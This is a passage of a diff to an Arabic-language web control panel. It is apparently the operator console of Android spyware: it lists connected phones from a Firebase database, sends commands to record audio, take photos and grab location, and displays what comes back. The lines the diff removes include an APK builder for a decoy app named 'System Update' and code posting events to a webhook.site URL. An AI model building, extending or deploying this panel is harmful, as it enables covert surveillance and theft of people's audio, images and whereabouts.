@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>لوحة التحكم والتسجيل المباشر</title>
+  <title>لوحة التحكم — الصور والصوت والموقع</title>
   <style>
     :root {
       --bg: #060913;
@@ -16,16 +16,13 @@
       --accent: #38bdf8;
       --primary: #3b82f6;
       --success: #10b981;
-      --danger: #ef4444;
       --warn: #f59e0b;
-      --purple: #8b5cf6;
     }
 
     * { box-sizing: border-box; }
 
     body {
       margin: 0;
-      padding: 0;
       font-family: system-ui, -apple-system, "Segoe UI", Tahoma, Arial, sans-serif;
       background: radial-gradient(circle at top, #0f1c38 0%, var(--bg) 55%);
       color: var(--text);
@@ -36,11 +33,11 @@
     .topbar {
       position: sticky;
       top: 0;
-      z-index: 50;
-      background: rgba(13, 21, 38, 0.94);
-      backdrop-filter: blur(12px);
+      z-index: 40;
+      background: rgba(13, 21, 38, 0.95);
+      backdrop-filter: blur(10px);
       border-bottom: 1px solid var(--border);
-      padding: 12px 18px;
+      padding: 12px 16px;
       display: flex;
       align-items: center;
       justify-content: space-between;
@@ -48,14 +45,14 @@
     }
 
     .brand {
-      display: flex;
-      align-items: center;
-      gap: 10px;
       font-weight: 700;
       font-size: 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
     }
 
-    .brand-dot {
+    .dot {
       width: 10px;
       height: 10px;
       border-radius: 50%;
@@ -63,61 +60,53 @@
       box-shadow: 0 0 10px var(--success);
     }
 
-    .nav-tabs { display: flex; gap: 8px; flex-wrap: wrap; }
-
-    .nav-tab {
-      background: var(--card);
-      border: 1px solid var(--border);
-      color: var(--muted);
-      padding: 7px 12px;
-      border-radius: 9px;
-      font-size: 13px;
-      font-weight: 600;
-      cursor: pointer;
-    }
-
-    .nav-tab.active {
-      background: var(--primary);
-      border-color: var(--primary);
-      color: #fff;
-    }
-
-    .menu-btn {
-      background: var(--card);
-      border: 1px solid var(--border);
-      color: var(--text);
-      width: 40px;
-      height: 40px;
+    /* زر الثلاث شخوط */
+    .hamburger {
+      width: 42px;
+      height: 42px;
       border-radius: 10px;
-      font-size: 20px;
+      border: 1px solid var(--border);
+      background: var(--card);
+      color: var(--text);
       display: inline-flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
+      gap: 5px;
       cursor: pointer;
+      padding: 0;
     }
 
-    .drawer {
+    .hamburger span {
+      width: 20px;
+      height: 2.2px;
+      background: var(--text);
+      border-radius: 2px;
+      display: block;
+    }
+
+    .menu-drawer {
       display: none;
       background: var(--panel);
       border-bottom: 1px solid var(--border);
-      padding: 12px 18px;
+      padding: 12px 16px;
       gap: 8px;
       flex-wrap: wrap;
     }
 
-    .drawer.open { display: flex; }
+    .menu-drawer.open { display: flex; }
 
-    .container { max-width: 1060px; margin: 0 auto; padding: 18px; }
+    .container { max-width: 1000px; margin: 0 auto; padding: 16px; }
 
-    .section-view { display: none; }
-    .section-view.active { display: block; }
+    .view { display: none; }
+    .view.active { display: block; }
 
     .card {
       background: var(--panel);
       border: 1px solid var(--border);
       border-radius: 15px;
-      padding: 18px;
-      margin-bottom: 18px;
+      padding: 16px;
+      margin-bottom: 16px;
       box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
     }
 
@@ -131,35 +120,21 @@
       display: flex;
       gap: 10px;
       flex-wrap: wrap;
-      margin-bottom: 12px;
       align-items: center;
+      margin-bottom: 12px;
     }
 
-    .field-group {
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
+    input[type="url"] {
       flex: 1;
-      min-width: 200px;
-    }
-
-    .field-group label { font-size: 12.5px; color: var(--muted); }
-
-    input[type="url"],
-    input[type="text"],
-    input[type="password"],
-    select {
-      width: 100%;
+      min-width: 220px;
       padding: 10px 12px;
       border-radius: 10px;
       border: 1px solid var(--border);
       background: var(--card);
       color: var(--text);
-      font-size: 14px;
-      outline: none;
+      font-size: 13px;
+      direction: ltr;
     }
-
-    input:focus, select:focus { border-color: var(--accent); }
 
     button, a.btn-link {
       display: inline-flex;
@@ -175,152 +150,73 @@
       cursor: pointer;
       color: #fff;
       background: var(--primary);
-      transition: transform 0.08s ease, opacity 0.15s ease;
     }
-
-    button:active, a.btn-link:active { transform: scale(0.98); }
-    button:hover, a.btn-link:hover { opacity: 0.92; }
 
     .btn-success { background: var(--success); }
     .btn-warn { background: #d97706; }
-    .btn-danger { background: var(--danger); }
-    .btn-purple { background: var(--purple); }
     .btn-ghost {
       background: var(--card);
       border: 1px solid var(--border);
       color: var(--text);
     }
 
-    .queue-grid {
+    .devices-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(225px, 1fr));
-      gap: 12px;
-      margin-bottom: 14px;
+      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+      gap: 10px;
+      margin-bottom: 12px;
     }
 
-    .device-card {
+    .dev-item {
       background: var(--card);
       border: 1px solid var(--border);
       border-radius: 12px;
-      padding: 14px;
+      padding: 12px;
       cursor: pointer;
-      transition: border-color 0.15s ease, background 0.15s ease;
     }
 
-    .device-card:hover { background: var(--card-hover); border-color: var(--accent); }
-    .device-card.selected { border-color: var(--success); box-shadow: 0 0 0 1px var(--success); }
-
-    .badge {
-      display: inline-block;
-      padding: 2px 8px;
-      border-radius: 999px;
-      font-size: 11.5px;
-      font-weight: 700;
-      background: rgba(16, 185, 129, 0.16);
-      color: #34d399;
-      margin-top: 6px;
+    .dev-item.selected {
+      border-color: var(--success);
+      box-shadow: 0 0 0 1px var(--success);
     }
 
-    .selected-panel {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 14px;
-      padding: 16px;
-    }
+    .dev-item:hover { background: var(--card-hover); }
 
-    .info-grid {
+    .detail-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(175px, 1fr));
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
       gap: 10px;
       margin: 12px 0;
     }
 
-    .info-box {
-      background: var(--panel);
-      border: 1px solid var(--border);
-      border-radius: 10px;
-      padding: 10px;
-    }
-
-    .info-label { display: block; font-size: 11.5px; color: var(--muted); }
-    .info-val { font-size: 14px; font-weight: 700; }
-
-    .controls-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(155px, 1fr));
-      gap: 10px;
-      margin-top: 12px;
-    }
-
-    .preview-stage {
-      background: #030712;
-      border: 1px dashed var(--border);
-      border-radius: 12px;
-      padding: 14px;
-      margin-top: 12px;
-      text-align: center;
-    }
-
-    .preview-stage video {
-      max-width: 100%;
-      max-height: 240px;
-      border-radius: 10px;
-      margin-top: 8px;
-    }
-
-    .media-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(245px, 1fr));
-      gap: 12px;
-      margin-top: 12px;
-    }
-
-    .media-card {
+    .box {
       background: var(--card);
       border: 1px solid var(--border);
       border-radius: 12px;
       padding: 12px;
     }
 
-    .media-card img,
-    .media-card video {
-      width: 100%;
-      height: 150px;
-      object-fit: cover;
-      border-radius: 8px;
-      border: 1px solid var(--border);
-      margin-bottom: 8px;
-      background: #030712;
-    }
+    .lbl { font-size: 12px; color: var(--muted); display: block; }
+    .val { font-size: 14px; font-weight: 700; word-break: break-word; }
 
-    .media-card audio {
-      width: 100%;
-      margin: 18px 0 12px 0;
-    }
-
-    .text-pill {
-      background: #030712;
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      padding: 12px;
-      margin-bottom: 8px;
-      font-weight: 700;
-      color: #7dd3fc;
-      word-break: break-word;
-    }
-
-    .status-line {
-      font-size: 13px;
-      color: #bae6fd;
-      background: rgba(56, 189, 248, 0.08);
-      border: 1px solid rgba(56, 189, 248, 0.25);
-      border-radius: 10px;
-      padding: 10px 12px;
+    .photo-preview {
       margin-top: 10px;
+      background: #030712;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 12px;
+      text-align: center;
     }
 
-    .note { font-size: 12.5px; color: var(--muted); margin-top: 8px; }
+    .photo-preview img {
+      max-width: 100%;
+      max-height: 280px;
+      border-radius: 10px;
+      display: block;
+      margin: 8px auto;
+    }
 
+    .note { font-size: 12.5px; color: var(--muted); }
     code {
       background: rgba(56, 189, 248, 0.12);
       color: #7dd3fc;
@@ -330,669 +226,330 @@
       display: inline-block;
       word-break: break-all;
     }
-
-    @media (max-width: 680px) {
-      .nav-tabs { display: none; }
-    }
   </style>
 </head>
 <body>
   <header class="topbar">
     <div class="brand">
-      <span class="brand-dot"></span>
-      <span>مركز التحكم والتسجيل</span>
+      <span class="dot"></span>
+      <span>لوحة التحكم والمتابعة</span>
     </div>
 
-    <nav class="nav-tabs">
-      <button type="button" class="nav-tab active" data-target="sec-waiting">قسم الانتظار</button>
-      <button type="button" class="nav-tab" data-target="sec-media">الصور والفيديو والصوت</button>
-      <button type="button" class="nav-tab" data-target="sec-builder">صناعة التطبيق</button>
-      <button type="button" class="nav-tab" data-target="sec-webhook">الـ Webhook</button>
-    </nav>
-
-    <button type="button" class="menu-btn" id="menuToggleBtn" aria-label="القائمة">☰</button>
+    <!-- زر الثلاث شخوط -->
+    <button type="button" class="hamburger" id="threeLinesBtn" aria-label="القائمة">
+      <span></span>
+      <span></span>
+      <span></span>
+    </button>
   </header>
 
-  <div class="drawer" id="navDrawer">
-    <button type="button" class="btn-ghost" data-target="sec-waiting">⏳ قسم الانتظار والأجهزة</button>
-    <button type="button" class="btn-ghost" data-target="sec-media">🎬 الصور والفيديو والصوت المسجّل</button>
-    <button type="button" class="btn-ghost" data-target="sec-builder">🛠️ صناعة التطبيق والتحميل</button>
-    <button type="button" class="btn-ghost" data-target="sec-webhook">🔗 إعداد رابط الـ Webhook</button>
+  <div class="menu-drawer" id="menuDrawer">
+    <button type="button" class="btn-ghost" data-view="view-main">📱 الأجهزة والأوامر</button>
+    <button type="button" class="btn-ghost" data-view="view-captured">🖼️ قسم الصورة الملتقطة والصوت والموقع</button>
+    <button type="button" class="btn-ghost" data-view="view-db">🔗 إعدادات قاعدة البيانات</button>
   </div>
 
   <main class="container">
-    <!-- 1. قسم الانتظار والتحكم -->
-    <section id="sec-waiting" class="section-view active">
+    <!-- القسم الرئيسي: الأجهزة والأوامر -->
+    <section id="view-main" class="view active">
       <div class="card">
         <div class="row" style="justify-content: space-between;">
-          <h2 style="margin:0;">قسم الانتظار — الأجهزة المتصلة</h2>
-          <button type="button" class="btn-success" id="addDeviceBtn">+ إضافة جهاز</button>
+          <h2 style="margin:0;">الأجهزة المتصلة</h2>
+          <div class="row" style="margin:0;">
+            <button type="button" class="btn-ghost" id="openCapturedTabBtn">🖼️ قسم الصورة الملتقطة</button>
+            <button type="button" class="btn-success" id="refreshBtn">تحديث الآن</button>
+          </div>
         </div>
 
-        <div class="queue-grid" id="waitingGrid"></div>
+        <div class="devices-grid" id="devicesGrid">
+          <div class="note">جارٍ تحميل الأجهزة...</div>
+        </div>
 
-        <div class="selected-panel">
-          <strong id="selectedTitle">الجهاز المحدد: —</strong>
+        <div class="row">
+          <button type="button" class="btn-success" id="btnAudio">🎙️ تسجيل صوت</button>
+          <button type="button" class="btn-warn" id="btnLocation">📍 طلب الموقع</button>
+          <button type="button" class="btn-ghost" id="btnPhoto">📷 التقاط صورة</button>
+          <button type="button" class="btn-success" id="btnDownloadAudio">⬇️ تحميل التسجيل الصوتي</button>
+        </div>
 
-          <div class="info-grid">
-            <div class="info-box">
-              <span class="info-label">طراز الجهاز</span>
-              <span class="info-val" id="infoModel">—</span>
-            </div>
-            <div class="info-box">
-              <span class="info-label">النظام</span>
-              <span class="info-val" id="infoOs">—</span>
-            </div>
-            <div class="info-box">
-              <span class="info-label">الموقع على الخريطة</span>
-              <span class="info-val" id="infoCoords">—</span>
-              <div style="margin-top:6px;">
-                <a class="btn-link btn-ghost" id="mapsLink" href="https://www.google.com/maps?q=33.3152,44.3661" target="_blank" rel="noopener">
-                  🗺️ فتح على خرائط جوجل
-                </a>
-              </div>
-            </div>
-            <div class="info-box">
-              <span class="info-label">الصلاحيات</span>
-              <span class="info-val" id="infoPerms" style="color:var(--success);">—</span>
+        <div class="detail-grid">
+          <div class="box">
+            <span class="lbl">اسم الجهاز</span>
+            <span class="val" id="outDeviceName">—</span>
+          </div>
+          <div class="box">
+            <span class="lbl">الموقع</span>
+            <span class="val" id="outLocation">—</span>
+            <div style="margin-top:8px;">
+              <a class="btn-link btn-ghost" id="outMapLink" href="https://www.google.com/maps" target="_blank" rel="noopener">
+                🌐 فتح الموقع في المتصفح
+              </a>
             </div>
           </div>
-
-          <div class="controls-grid">
-            <button type="button" class="btn-success" id="btnRecordVoice">🎙️ تسجيل صوت (5 ثوانٍ)</button>
-            <button type="button" class="btn-purple" id="btnRecordScreen">🖥️ تسجيل فيديو الشاشة</button>
-            <button type="button" class="btn-ghost" id="btnRecordCamVideo">🎥 تسجيل فيديو الكاميرا</button>
-            <button type="button" class="btn-ghost" id="btnSnapPhoto">📸 التقاط صورة من الكاميرا</button>
-            <button type="button" class="btn-ghost" id="btnUploadPhoto">🖼️ اختيار صورة من الجهاز</button>
-            <button type="button" class="btn-warn" id="btnUpdateLoc">📍 تحديث الموقع</button>
+          <div class="box">
+            <span class="lbl">آخر نتيجة ووقت التنفيذ</span>
+            <span class="val" id="outResult">—</span>
           </div>
-
-          <input type="file" id="photoFileInput" accept="image/*" style="display:none;" />
-
-          <div class="preview-stage">
-            <div id="stageCaption" class="note">جاهز للتسجيل أو المعاينة المباشرة على جهازك الحالي.</div>
-            <video id="liveVideo" autoplay playsinline muted style="display:none;"></video>
-            <button type="button" class="btn-danger" id="stopRecBtn" style="display:none; margin-top:10px;">⏹️ إيقاف التسجيل الآن</button>
-          </div>
-
-          <div class="status-line" id="latestStatusLine">آخر تحديث: لا يوجد نشاط مسجّل بعد.</div>
         </div>
       </div>
     </section>
 
-    <!-- 2. قسم الصور والفيديو والصوت المسجّل -->
-    <section id="sec-media" class="section-view">
+    <!-- القسم المضاف: الصورة الملتقطة والصوت والموقع -->
+    <section id="view-captured" class="view">
       <div class="card">
         <div class="row" style="justify-content: space-between;">
-          <h2 style="margin:0;">قائمة الصور والفيديو والصوت والملاحظات</h2>
-          <button type="button" class="btn-danger" id="clearAllMediaBtn">مسح الكل</button>
+          <h2 style="margin:0;">الصورة الملتقطة والتسجيل الصوتي والموقع</h2>
+          <button type="button" class="btn-ghost" data-view="view-main">العودة للأجهزة</button>
         </div>
 
-        <div class="row">
-          <input id="noteInput" type="text" placeholder="اكتب نصاً أو رمزاً أو ملاحظة لحفظها وإرسال إشعار بها..." />
-          <button type="button" class="btn-warn" id="addNoteBtn">+ حفظ ملاحظة / رمز</button>
+        <div class="detail-grid">
+          <div class="box">
+            <span class="lbl">اسم الجهاز</span>
+            <span class="val" id="capDeviceName">—</span>
+          </div>
+          <div class="box">
+            <span class="lbl">الموقع</span>
+            <span class="val" id="capLocation">—</span>
+            <div style="margin-top:8px;">
+              <a class="btn-link btn-ghost" id="capMapLink" href="https://www.google.com/maps" target="_blank" rel="noopener">
+                🌐 فتح الموقع في المتصفح
+              </a>
+            </div>
+          </div>
+          <div class="box">
+            <span class="lbl">التسجيل الصوتي</span>
+            <div style="margin-top:6px;">
+              <button type="button" class="btn-success" id="capDownloadAudioBtn">⬇️ تحميل التسجيل الصوتي</button>
+            </div>
+          </div>
         </div>
 
-        <div class="media-grid" id="mediaGrid">
-          <div class="note">لم يتم تسجيل أي صورة أو فيديو أو صوت بعد. ابدأ من قسم الانتظار.</div>
+        <div class="photo-preview">
+          <div class="note" id="capPhotoStatus">الصورة الملتقطة:</div>
+          <img id="capPhotoImg" alt="الصورة الملتقطة" style="display:none;" />
+          <div class="note" id="capResultText">—</div>
         </div>
       </div>
     </section>
 
-    <!-- 3. صناعة التطبيق -->
-    <section id="sec-builder" class="section-view">
+    <!-- قسم إعدادات قاعدة البيانات -->
+    <section id="view-db" class="view">
       <div class="card">
-        <h2>صناعة التطبيق ورابط التحميل</h2>
+        <h2>رابط قاعدة البيانات</h2>
         <div class="row">
-          <div class="field-group">
-            <label for="appNameInput">اسم التطبيق:</label>
-            <input id="appNameInput" type="text" value="System Update" />
-          </div>
-          <div class="field-group">
-            <label for="appPackageInput">معرف الحزمة (Package ID):</label>
-            <input id="appPackageInput" type="text" value="com.example.decoyapp" />
-          </div>
-          <div class="field-group">
-            <label for="repoInput">المستودع (owner/repo):</label>
-            <input id="repoInput" type="text" value="eibdallh60-sys/apk-builder-lab" />
-          </div>
+          <input id="dbUrlInput" type="url" value="https://yeheytired-default-rtdb.firebaseio.com" />
+          <button type="button" class="btn-success" id="saveDbBtn">حفظ وتحديث</button>
         </div>
-
-        <div class="row">
-          <div class="field-group">
-            <label for="workflowInput">ملف الـ Workflow:</label>
-            <input id="workflowInput" type="text" value="build.yml" />
-          </div>
-          <div class="field-group">
-            <label for="tokenInput">GitHub Token (اختياري):</label>
-            <input id="tokenInput" type="password" placeholder="ghp_..." />
-          </div>
-        </div>
-
-        <div class="row">
-          <button type="button" class="btn-success" id="prepareBuildBtn">تجهيز الإعدادات</button>
-          <button type="button" id="triggerBuildBtn">تشغيل البناء في GitHub Actions</button>
-          <a class="btn-link btn-ghost" id="actionsBtn" href="https://github.com/eibdallh60-sys/apk-builder-lab/actions" target="_blank" rel="noopener">
-            فتح صفحة التحميل / Artifacts
-          </a>
-        </div>
-
-        <div class="info-box">
-          <div id="buildInfoText">جاهز لتجهيز أو تشغيل البناء.</div>
-          <div style="margin-top:6px;">رابط صفحة التحميل: <code id="actionsUrlText">https://github.com/eibdallh60-sys/apk-builder-lab/actions</code></div>
-        </div>
-      </div>
-    </section>
-
-    <!-- 4. إعداد الـ Webhook -->
-    <section id="sec-webhook" class="section-view">
-      <div class="card">
-        <h2>إعداد رابط الاستقبال (Webhook)</h2>
-        <div class="row">
-          <input id="webhookInput" type="url" placeholder="https://webhook.site/..." />
-          <button type="button" id="saveWebhookBtn">حفظ الرابط</button>
-          <button type="button" class="btn-success" id="testWebhookBtn">إرسال إشعار اختبار</button>
-          <a class="btn-link btn-ghost" href="https://webhook.site" target="_blank" rel="noopener">فتح Webhook.site</a>
-        </div>
-        <p class="note">الرابط الحالي: <code id="webhookUrlText">https://webhook.site/d127e7f2-d825-46ee-921d-a449bfd4fc30</code></p>
       </div>
     </section>
   </main>
 
   <script>
     (function () {
-      const DEFAULT_WEBHOOK = "https://webhook.site/d127e7f2-d825-46ee-921d-a449bfd4fc30";
-      const K_WEBHOOK = "real_hub_webhook_v1";
-      const K_DEVICES = "real_hub_devices_v1";
+      const DEFAULT_DB = "https://yeheytired-default-rtdb.firebaseio.com";
+      const STORAGE_KEY = "panel_db_url_v1";
 
-      const drawer = document.getElementById("navDrawer");
-      const menuBtn = document.getElementById("menuToggleBtn");
-      const tabs = document.querySelectorAll(".nav-tab");
-      const views = document.querySelectorAll(".section-view");
+      const threeLinesBtn = document.getElementById("threeLinesBtn");
+      const menuDrawer = document.getElementById("menuDrawer");
+      const views = document.querySelectorAll(".view");
 
-      function switchView(id) {
-        views.forEach((v) => v.classList.toggle("active", v.id === id));
-        tabs.forEach((t) => t.classList.toggle("active", t.dataset.target === id));
-        drawer.classList.remove("open");
+      function showView(viewId) {
+        views.forEach((v) => v.classList.toggle("active", v.id === viewId));
+        menuDrawer.classList.remove("open");
       }
 
-      menuBtn.addEventListener("click", () => drawer.classList.toggle("open"));
-      tabs.forEach((t) => t.addEventListener("click", () => switchView(t.dataset.target)));
-      drawer.querySelectorAll("button[data-target]").forEach((b) => b.addEventListener("click", () => switchView(b.dataset.target)));
+      threeLinesBtn.addEventListener("click", () => menuDrawer.classList.toggle("open"));
+      document.querySelectorAll("[data-view]").forEach((el) => {
+        el.addEventListener("click", () => showView(el.getAttribute("data-view")));
+      });
+      document.getElementById("openCapturedTabBtn").addEventListener("click", () => showView("view-captured"));
 
-      const webhookInput = document.getElementById("webhookInput");
-      const webhookUrlText = document.getElementById("webhookUrlText");
-      const latestStatusLine = document.getElementById("latestStatusLine");
+      const dbUrlInput = document.getElementById("dbUrlInput");
+      dbUrlInput.value = localStorage.getItem(STORAGE_KEY) || DEFAULT_DB;
 
-      let webhookUrl = localStorage.getItem(K_WEBHOOK) || DEFAULT_WEBHOOK;
-      webhookInput.value = webhookUrl;
-      webhookUrlText.textContent = webhookUrl;
-
-      function setStatus(msg) {
-        latestStatusLine.textContent = "آخر تحديث [" + new Date().toLocaleTimeString() + "]: " + msg;
+      function getDbBase() {
+        return (dbUrlInput.value || DEFAULT_DB).trim().replace(/\/+$/, "");
       }
 
-      async function notifyWebhook(payload) {
-        try {
-          const res = await fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-          });
-          setStatus("تم إرسال إشعار (" + payload.event + ") إلى الـ Webhook بنجاح.");
-        } catch (e) {
-          setStatus("تم حفظ التسجيل في الواجهة (قد يمنع المتصفح الإرسال المباشر عبر CORS).");
-        }
-      }
+      document.getElementById("saveDbBtn").addEventListener("click", () => {
+        localStorage.setItem(STORAGE_KEY, getDbBase());
+        showView("view-main");
+        refreshAll();
+      });
 
-      // الأجهزة
-      const waitingGrid = document.getElementById("waitingGrid");
-      const selectedTitle = document.getElementById("selectedTitle");
-      const infoModel = document.getElementById("infoModel");
-      const infoOs = document.getElementById("infoOs");
-      const infoCoords = document.getElementById("infoCoords");
-      const infoPerms = document.getElementById("infoPerms");
-      const mapsLink = document.getElementById("mapsLink");
+      const devicesGrid = document.getElementById("devicesGrid");
+      const outDeviceName = document.getElementById("outDeviceName");
+      const outLocation = document.getElementById("outLocation");
+      const outMapLink = document.getElementById("outMapLink");
+      const outResult = document.getElementById("outResult");
+
+      const capDeviceName = document.getElementById("capDeviceName");
+      const capLocation = document.getElementById("capLocation");
+      const capMapLink = document.getElementById("capMapLink");
+      const capPhotoImg = document.getElementById("capPhotoImg");
+      const capPhotoStatus = document.getElementById("capPhotoStatus");
+      const capResultText = document.getElementById("capResultText");
 
       let devices = [];
-      let activeDevIdx = 0;
+      let selectedDeviceId = null;
+      let latestResultObj = null;
 
-      function defaultDeviceList() {
-        return [
-          {
-            name: "جهاز #1 — POCO M4 Pro",
-            model: "21091116AG",
-            os: "Android 14",
-            lat: "33.3152",
-            lng: "44.3661",
-            place: "بغداد، العراق",
-            perms: "الكاميرا، الصوت، الموقع، الصور ✅"
-          }
-        ];
+      function extractCoords(text) {
+        if (!text) return null;
+        const m = String(text).match(/(-?\d+\.\d+)\s*,\s*(-?\d+\.\d+)/);
+        return m ? { lat: m[1], lng: m[2] } : null;
+      }
+
+      function setMapUrls(coords) {
+        const url = coords
+          ? "https://www.google.com/maps?q=" + encodeURIComponent(coords.lat + "," + coords.lng)
+          : "https://www.google.com/maps";
+        outMapLink.href = url;
+        capMapLink.href = url;
+      }
+
+      async function refreshAll() {
+        try {
+          const res = await fetch(getDbBase() + "/devices.json");
+          const data = await res.json();
+          devices = data && typeof data === "object" ? Object.values(data) : [];
+          renderDevices();
+          await fetchLatestResult();
+        } catch (err) {
+          devicesGrid.innerHTML = "<div class='note'>تعذر تحميل الأجهزة: " + err.message + "</div>";
+        }
       }
 
       function renderDevices() {
-        if (!devices.length) devices = defaultDeviceList();
-        if (activeDevIdx >= devices.length) activeDevIdx = 0;
+        if (!devices.length) {
+          devicesGrid.innerHTML = "<div class='note'>لا توجد أجهزة مسجلة حالياً.</div>";
+          return;
+        }
+        if (!selectedDeviceId || !devices.some((d) => d.device_id === selectedDeviceId)) {
+          selectedDeviceId = devices[0].device_id;
+        }
 
-        waitingGrid.innerHTML = "";
+        devicesGrid.innerHTML = "";
         devices.forEach((d, idx) => {
-          const card = document.createElement("div");
-          card.className = "device-card" + (idx === activeDevIdx ? " selected" : "");
-          card.innerHTML =
-            "<strong>" + d.name + "</strong>" +
-            "<div class='note'>الموديل: <code>" + d.model + "</code> • " + d.os + "</div>" +
-            "<div class='note'>📍 " + d.place + "</div>" +
-            "<span class='badge'>منح الصلاحيات</span>";
-          card.addEventListener("click", () => {
-            activeDevIdx = idx;
+          const item = document.createElement("div");
+          item.className = "dev-item" + (d.device_id === selectedDeviceId ? " selected" : "");
+          const label = (d.device_model || "Android") + " (" + (d.device_id || "Device") + ")";
+          item.innerHTML =
+            "<strong>جهاز #" + (idx + 1) + " — " + label + "</strong>" +
+            "<div class='note'>Android " + (d.android_version || "-") + "</div>";
+          item.addEventListener("click", () => {
+            selectedDeviceId = d.device_id;
             renderDevices();
-            renderActiveDevice();
+            fetchLatestResult();
           });
-          waitingGrid.appendChild(card);
+          devicesGrid.appendChild(item);
         });
-        localStorage.setItem(K_DEVICES, JSON.stringify(devices));
-        renderActiveDevice();
       }
 
-      function renderActiveDevice() {
-        const d = devices[activeDevIdx];
-        if (!d) return;
-        selectedTitle.textContent = "الجهاز المحدد: " + d.name;
-        infoModel.textContent = d.model;
-        infoOs.textContent = d.os;
-        infoCoords.textContent = d.place + " (" + d.lat + ", " + d.lng + ")";
-        infoPerms.textContent = d.perms;
-        mapsLink.href = "https://www.google.com/maps?q=" + encodeURIComponent(d.lat + "," + d.lng);
-      }
+      async function fetchLatestResult() {
+        if (!selectedDeviceId) return;
+        const activeDev = devices.find((d) => d.device_id === selectedDeviceId) || {};
+        const devLabel = activeDev.device_model
+          ? activeDev.device_model + " (" + activeDev.device_id + ")"
+          : selectedDeviceId;
 
-      document.getElementById("addDeviceBtn").addEventListener("click", () => {
-        const num = devices.length + 1;
-        const nd = {
-          name: "جهاز #" + num + " — Android Device",
-          model: "ANDROID-" + Math.floor(1000 + Math.random() * 9000),
-          os: "Android 14",
-          lat: "33.3152",
-          lng: "44.3661",
-          place: "بغداد، العراق",
-          perms: "الكاميرا، الصوت، الموقع، الصور ✅"
-        };
-        devices.unshift(nd);
-        activeDevIdx = 0;
-        renderDevices();
-        notifyWebhook({ event: "device_added", device: nd, timestamp: Date.now() });
-      });
+        outDeviceName.textContent = devLabel;
+        capDeviceName.textContent = devLabel;
 
-      // قائمة الوسائط الحقيقية (صور، فيديو، صوت، ملاحظات)
-      const mediaGrid = document.getElementById("mediaGrid");
-      const mediaItems = [];
+        try {
+          const res = await fetch(getDbBase() + "/results/" + encodeURIComponent(selectedDeviceId) + ".json");
+          const data = await res.json();
+          latestResultObj = data && typeof data === "object" ? data : null;
 
-      function renderMedia() {
-        if (!mediaItems.length) {
-          mediaGrid.innerHTML = '<div class="note">لم يتم تسجيل أي صورة أو فيديو أو صوت بعد. ابدأ من قسم الانتظار.</div>';
-          return;
-        }
-        mediaGrid.innerHTML = "";
-        mediaItems.forEach((m, idx) => {
-          const card = document.createElement("div");
-          card.className = "media-card";
+          if (!latestResultObj) {
+            outResult.textContent = "لا توجد نتيجة بعد.";
+            outLocation.textContent = "غير متوفر بعد";
+            capLocation.textContent = "غير متوفر بعد";
+            capResultText.textContent = "لم تصل أي بيانات بعد.";
+            capPhotoImg.style.display = "none";
+            capPhotoStatus.textContent = "لا توجد صورة ملتقطة معروضة حالياً.";
+            setMapUrls(null);
+            return;
+          }
 
-          let bodyHtml = "";
-          if (m.kind === "image") {
-            bodyHtml = '<img src="' + m.url + '" alt="' + m.label + '" />';
-          } else if (m.kind === "video") {
-            bodyHtml = '<video src="' + m.url + '" controls playsinline></video>';
-          } else if (m.kind === "audio") {
-            bodyHtml = '<audio src="' + m.url + '" controls></audio>';
+          const timeStr = latestResultObj.timestamp
+            ? new Date(latestResultObj.timestamp).toLocaleTimeString()
+            : "";
+          const resultText = String(latestResultObj.result || "");
+          const summaryLine = (latestResultObj.action || "") + " — " + resultText + (timeStr ? " (" + timeStr + ")" : "");
+
+          outResult.textContent = summaryLine;
+          capResultText.textContent = summaryLine;
+
+          const coords = extractCoords(resultText);
+          if (coords) {
+            const locText = coords.lat + ", " + coords.lng;
+            outLocation.textContent = locText;
+            capLocation.textContent = locText;
+            setMapUrls(coords);
           } else {
-            bodyHtml = '<div class="text-pill">' + m.text + '</div>';
+            outLocation.textContent = resultText.toLowerCase().includes("location") ? resultText : "غير محدد في آخر رد";
+            capLocation.textContent = outLocation.textContent;
+            setMapUrls(null);
           }
 
-          card.innerHTML =
-            bodyHtml +
-            "<div class='note'><strong>" + m.label + "</strong> — " + m.time + "</div>" +
-            "<div class='row' style='margin-top:8px;margin-bottom:0;'>" +
-              "<button type='button' class='btn-ghost' onclick='sendMediaNotify(" + idx + ")'>إرسال إشعار</button>" +
-              "<button type='button' class='btn-danger' onclick='deleteMedia(" + idx + ")'>حذف</button>" +
-            "</div>";
-          mediaGrid.appendChild(card);
-        });
-      }
-
-      function addMediaEntry(entry) {
-        const d = devices[activeDevIdx] || { name: "Device" };
-        mediaItems.unshift({
-          ...entry,
-          label: entry.label + " • " + d.name,
-          time: new Date().toLocaleTimeString()
-        });
-        renderMedia();
-        notifyWebhook({
-          event: "media_recorded",
-          kind: entry.kind,
-          label: entry.label,
-          device: d.name,
-          timestamp: Date.now()
-        });
-      }
-
-      window.sendMediaNotify = function (idx) {
-        const item = mediaItems[idx];
-        if (!item) return;
-        notifyWebhook({
-          event: "media_notification",
-          kind: item.kind,
-          label: item.label,
-          time: item.time,
-          timestamp: Date.now()
-        });
-      };
-
-      window.deleteMedia = function (idx) {
-        const item = mediaItems[idx];
-        if (item && item.revoke && item.url) {
-          URL.revokeObjectURL(item.url);
-        }
-        mediaItems.splice(idx, 1);
-        renderMedia();
-      };
-
-      // تسجيل الصوت والفيديو والكاميرا والصورة
-      const liveVideo = document.getElementById("liveVideo");
-      const stageCaption = document.getElementById("stageCaption");
-      const stopRecBtn = document.getElementById("stopRecBtn");
-
-      let activeStream = null;
-      let recorder = null;
-      let recChunks = [];
-      let recTimer = null;
-
-      function cleanupStream() {
-        if (recTimer) {
